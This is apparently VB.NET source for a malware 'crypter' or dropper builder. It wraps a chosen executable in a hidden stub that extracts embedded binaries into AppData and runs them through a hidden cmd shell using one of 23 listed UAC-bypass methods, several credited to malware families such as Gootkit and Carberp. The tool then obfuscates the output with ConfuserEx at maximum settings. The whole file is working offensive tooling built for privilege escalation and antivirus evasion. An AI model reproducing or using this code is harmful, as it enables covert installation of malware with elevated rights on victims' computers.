Imports System.IO
Imports System.CodeDom.Compiler

Public Class Form11
    Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Dim uacIconFile As String
    Dim uacoutfile As String = ""
    Dim uacinfile As String = ""
    Dim uacinfilename As String = ""
    Dim uacstring() As String
    Dim uacCode As String
    Dim ultrcs As String()
    Dim tempoutfile As String = ""
    Public udfile As String

    

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim uacofd As New OpenFileDialog
        uacofd.Filter = "Exe Files|*.exe"
        If uacofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            uacinfile = uacofd.FileName
            uacinfilename = System.IO.Path.GetFileName(uacofd.FileName)
            TextBox1.Text = uacofd.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim uacsfd As New SaveFileDialog
        uacsfd.Filter = "Exe Files|*.exe"

        If uacsfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            uacoutfile = uacsfd.FileName
            udfile = System.IO.Path.GetFileName(uacoutfile)
            TextBox3.Text = uacsfd.FileName
            tempoutfile = Path.GetTempPath & udfile

        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Icon Files|*.ico"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            uacIconFile = ofd.FileName
            TextBox2.Text = ofd.FileName
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        If TextBox1.Text = "" Or TextBox2.Text = "" Or TextBox3.Text = "" Or (RadioButton1.Checked = False And RadioButton2.Checked = False) Then
            MsgBox("One or more inputs missing! Check if you have specified the source, icon, output, CPU-32/64 and method. ")

        Else
            Try
                Compileuac(tempoutfile)
                If RadioButton1.Checked = True Then
                    ultrcs = {uacinfile, dGVzdHBhdGg & "\Z33nie\syslog32.exe"}
                ElseIf RadioButton2.Checked = True Then
                    ultrcs = {uacinfile, dGVzdHBhdGg & "\Z33nie\syslog64.exe"}
                End If

                Executeuac(tempoutfile, ultrcs)

                Using crx2 As StreamWriter = New StreamWriter(dGVzdHBhdGg & "\Z33nie\uacryptxml.crproj")

                    crx2.WriteLine("<project baseDir=""" + Path.GetDirectoryName(tempoutfile) + """ outputDir=""" + Path.GetDirectoryName(uacoutfile) + "\Output" + """ xmlns=""" + "http://confuser.codeplex.com""" + ">")
                    crx2.WriteLine("<module path=""" + tempoutfile + """>")
                    crx2.WriteLine("<rule preset=""" + "maximum""" + " pattern=""" + "true""" + " inherit=""" + "false""" + "/>")
                    crx2.WriteLine("</module>")
                    crx2.WriteLine(" </project>")

                    crx2.Close()

                End Using

                Try

                    Dim cryptxmlpath As String = dGVzdHBhdGg & "\Z33nie\uacryptxml.crproj"

                    Shell("cmd.exe /c cd " & dGVzdHBhdGg & "\Z33nie\Confuser & Confuser.CLI.exe " & cryptxmlpath, AppWinStyle.Hide)
                    System.Threading.Thread.Sleep(10000)

                Catch ex As Exception
                    MsgBox("Something Went wrong in creating EXE. Please contact Support. Error#CX1")
                End Try

            Catch ex As Exception
                MsgBox("Something Went wrong in creating EXE. Please contact Support. Error#CX2")
            End Try

            Try
                File.Delete(tempoutfile)
            Catch ex As Exception

            End Try

            Me.Close()

        End If
    End Sub

    Sub Compileuac(ByVal uacoutfile As String)
        Dim codeline25 As String
        Dim codeline29 As String

        Dim codeline0 As String = "Imports System.Windows.Forms"
        Dim codeline1 As String = "Imports System"
        Dim codeline2 As String = "Imports System.Environment"
        Dim codeline3 As String = "Imports System.Net"
        Dim codeline4 As String = "Imports System.Diagnostics"
        Dim codeline5 As String = "Imports Microsoft.VisualBasic"
        Dim codeline6 As String = "Imports System.IO"
        Dim codeline7 As String = "Namespace R0ll3rc0ast3r"
        Dim codeline8 As String = "Public Class Initiate"
        Dim codeline9 As String = "Public Shared Sub Main(argob As [String]())"
        Dim codeline10 As String = "Dim FrmMainR0ll3rc0ast3r As New Form1"
        Dim codeline11 As String = "Application.Run(FrmMainR0ll3rc0ast3r)"
        Dim codeline12 As String = "End Sub"
        Dim codeline13 As String = "End Class"
        Dim codeline14 As String = "Public Class Form1"
        Dim codeline15 As String = "Inherits System.Windows.Forms.Form"
        Dim codeline16 As String = "Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
        Dim codeline17 As String = "Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load"
        Dim codeline18 As String = "Me.Hide()"
        Dim codeline19 As String = "Me.ShowInTaskbar = False"
        Dim codeline20 As String = "Me.WindowState = FormWindowState.Minimized"
        Dim codeline21 As String = "Dim dirpath As String = dGVzdHBhdGg & " + """\SysConfigData"""
        Dim codeline22 As String = "If Not Directory.Exists(dirpath) Then"
        Dim codeline23 As String = "Directory.CreateDirectory(dirpath)"
        Dim codeline24 As String = "End If"
        If RadioButton1.Checked = True Then
            codeline25 = "ExtractResourceToDisk(" + """syslog32.exe""" + ", dGVzdHBhdGg & " + """\SysConfigData\syslog32.exe""" + ")"
        ElseIf RadioButton2.Checked = True Then
            codeline25 = "ExtractResourceToDisk(" + """syslog64.exe""" + ", dGVzdHBhdGg & " + """\SysConfigData\syslog64.exe""" + ")"
        End If

        Dim codeline26 As String = "ExtractResourceToDisk(""" + uacinfilename + """, dGVzdHBhdGg & " + """\SysConfigData\" + uacinfilename + """)"


        Dim codeline27 As String = "Dim arguments As String"
        Dim codeline28 As String = "arguments = """ & "  """ & "+ " & """" & NumericUpDown1.Value & """" & " +" & " """ & "  """ & " + dGVzdHBhdGg + """ & "\SysConfigData\""" & "+" & """" & uacinfilename & """"

        If RadioButton1.Checked = True Then

            codeline29 = "Shell(""" + "cmd.exe /c cd """ + " & dGVzdHBhdGg & """ + "\SysConfigData & syslog32.exe """ + " & arguments, AppWinStyle.Hide)"

        ElseIf RadioButton2.Checked = True Then

            codeline29 = "Shell(""" + "cmd.exe /c cd """ + " & dGVzdHBhdGg & """ + "\SysConfigData & syslog64.exe """ + " & arguments, AppWinStyle.Hide)"

        End If

        Dim codeline36 As String = "End Sub"

        Dim codeline37 As String = "Public Function ExtractResourceToDisk(ByVal ResourceName As String, ByVal FileToExtractTo As String) As Boolean"
        Dim codeline38 As String = "Using s As System.IO.Stream = System.Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(ResourceName)"
        Dim codeline39 As String = "Using ResourceFile As New System.IO.FileStream(FileToExtractTo, IO.FileMode.Create)"
        Dim codeline40 As String = "Dim b(CInt(s.Length) - 1) As Byte"
        Dim codeline41 As String = "s.Read(b, 0, CInt(s.Length))"
        Dim codeline42 As String = "ResourceFile.Write(b, 0, b.Length)"
        Dim codeline43 As String = "End Using"
        Dim codeline44 As String = "End Using"
        Dim codeline45 As String = " "
        Dim codeline46 As String = "End Function"
        Dim codeline47 As String = "End Class"
        Dim codeline48 As String = "End Namespace"

        uacstring = New String(42) {codeline0, codeline1, codeline2, codeline3, codeline4, codeline5, codeline6, codeline7, codeline8, codeline9, codeline10, codeline11, codeline12, codeline13, codeline14, codeline15, codeline16, codeline17, codeline18, codeline19, codeline20, codeline21, codeline22, codeline23, codeline24, codeline25, codeline26, codeline27, codeline28, codeline29, codeline36, codeline37, codeline38, codeline39, codeline40, codeline41, codeline42, codeline43, codeline44, codeline45, codeline46, codeline47, codeline48}

        uacCode = String.Join(vbNewLine, uacstring)

    End Sub

    Sub Executeuac(ByVal Destination As String, ByVal obResources As String())
        Dim cp3 As New CompilerParameters

        cp3.ReferencedAssemblies.Add("System.dll")
        cp3.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Windows.Forms.dll")
        cp3.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Drawing.dll")
        cp3.ReferencedAssemblies.Add(Application.StartupPath & "\Resources\" & "System.Core.dll")


        cp3.CompilerOptions = " /target:winexe /optimize /win32icon:" + uacIconFile


        Dim Provider As New VBCodeProvider

        For Each psr As String In obResources
            cp3.EmbeddedResources.Add(psr)
        Next

        cp3.GenerateExecutable = True
        cp3.OutputAssembly = Destination
        cp3.GenerateInMemory = False

        Dim errors As System.CodeDom.Compiler.CompilerResults = Provider.CompileAssemblyFromSource(cp3, uacCode)
        If errors.Errors.HasErrors Then
            MessageBox.Show(errors.Errors(0).ToString)
        End If


    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged

        Select Case NumericUpDown1.Value

            Case "1"
                RichTextBox1.Text = "Leo Davidson sysprep method, this will work only on Windows 7 and Windows 8, used in multiple malware"
            Case "2"
                RichTextBox1.Text = " Tweaked Leo Davidson sysprep method, this will work only on Windows 8.1.9600"
            Case "3"
                RichTextBox1.Text = "Leo Davidson method tweaked by WinNT/Pitou developers, works from Windows 7 up to 10th2 10532"
            Case "4"
                RichTextBox1.Text = "Application Compatibility Shim RedirectEXE method, from WinNT/Gootkit. Works from Windows 7 up to 8.1.9600. Unavailable in 64 bit edition because of Shim restriction"
            Case "5"
                RichTextBox1.Text = "ISecurityEditor WinNT/Simda method, used to turn off UAC, works from Windows 7 up to Windows 10th1 100136. Using this method will permanently turn off UAC (after reboot)"
            Case "6"
                RichTextBox1.Text = "Wusa method used by Win32/Carberp, tweaked to work with Windows 8/8.1 also. Unavailable in wow64 environment starting from Windows 8"
            Case "7"
                RichTextBox1.Text = "Wusa method, tweaked to work from Windows 7 up to 10th1 10136"
            Case "8"
                RichTextBox1.Text = "Slightly modified Leo Davidson method used by Win32/Tilon, works only on Windows 7"
            Case "9"
                RichTextBox1.Text = "Hybrid method, combination of WinNT/Simda and Win32/Carberp + AVrf, works from Windows 7 up to 10th1 10136. Using this method will permanently compromise security of target key(IFEO)"
            Case "10"
                RichTextBox1.Text = "Hybrid method, abusing appinfo.dll way of whitelisting autoelevated applications and KnownDlls cache changes, works from Windows 7 up to 10th2 10532"
            Case "11"
                RichTextBox1.Text = "WinNT/Gootkit second method based on the memory patching from MS 'Fix it' patch shim (and as side effect - arbitrary dll injection), works from Windows 7 up to 8.1.9600.  Implemented in x86-32 version"
            Case "12"
                RichTextBox1.Text = "Windows 10 sysprep method, abusing different dll dependency added in Windows 10 (works up to 10th2 10558)"
            Case "13"
                RichTextBox1.Text = "Hybrid method, abusing Microsoft Management Console and EventViewer missing dependency, works from Windows 7 up to 10rs1 14295. Implemented only in x64 version"
            Case "14"
                RichTextBox1.Text = "WinNT/Sirefef method, abusing appinfo.dll way of whitelisting OOBE.exe, works from Windows 7 up to 10th2 10558"
            Case "15"
                RichTextBox1.Text = "Win32/Addrop method, also used in Metasploit uacbypass module, works from Windows 7 up to 10rs1 14295"
            Case "16"
                RichTextBox1.Text = "Hybrid method working together with Microsoft GWX backdoor, works from Windows 7 up to 10rs1 14295"
            Case "17"
                RichTextBox1.Text = "Hybrid method, abuses appinfo whitelist/logic/API choice&usage, works from Windows 8.1 (9600) up to 10rs1 14367"
            Case "18"
                RichTextBox1.Text = "Hybrid method, abuses SxS undocumented backdoor used to fix (1) and appinfo whitelist, works from Windows 7 up to 10rs1 14367"
            Case "19"
                RichTextBox1.Text = "Hybrid method, using InetMgr IIS module and based on 10 & 16 MS fixes, works from Windows 7 up to 10rs1 14372. Implemented only in x64 version"
            Case "20"
                RichTextBox1.Text = "Hybrid method, abusing Microsoft Management Console and incorrect dll loading scheme, works from Windows 7 up to 10rs2 14905"
            Case "21"
                RichTextBox1.Text = "Hybrid method, abusing SxS DotLocal and targeting sysprep, works from Windows 7 up to 10rs2 14905"
            Case "22"
                RichTextBox1.Text = "Hybrid method, abusing SxS DotLocal and targeting consent to gain system privileges, works from Windows 7 up to 10rs2 14905"
            Case "23"
                RichTextBox1.Text = "Hybrid method, abusing Package Manager and DISM, works from Windows 7 up to 10rs2 14905"

                Exit Select

        End Select
    End Sub

    
    
    Private Sub Button4_MouseHover(sender As Object, e As EventArgs) Handles Button4.MouseHover
        Button4.BackColor = Color.DimGray
    End Sub

    Private Sub Button4_MouseLeave(sender As Object, e As EventArgs) Handles Button4.MouseLeave
        Button4.BackColor = Color.Black
    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            Label7.ForeColor = Color.White

        ElseIf RadioButton1.Checked = False Then
            Label7.ForeColor = Color.DarkGray
        End If
    End Sub

    Private Sub Button1_MouseHover(sender As Object, e As EventArgs) Handles Button1.MouseHover
        Button1.BackColor = Color.DarkGray
    End Sub

    Private Sub Button1_MouseLeave(sender As Object, e As EventArgs) Handles Button1.MouseLeave
        Button1.BackColor = Color.Black
    End Sub

    Private Sub Button2_MouseHover(sender As Object, e As EventArgs) Handles Button2.MouseHover
        Button2.BackColor = Color.DarkGray
    End Sub

    Private Sub Button2_MouseLeave(sender As Object, e As EventArgs) Handles Button2.MouseLeave
        Button2.BackColor = Color.Black
    End Sub

    Private Sub Button3_MouseHover(sender As Object, e As EventArgs) Handles Button3.MouseHover
        Button3.BackColor = Color.DarkGray
    End Sub

    Private Sub Button3_MouseLeave(sender As Object, e As EventArgs) Handles Button3.MouseLeave
        Button3.BackColor = Color.Black
    End Sub

    
End Class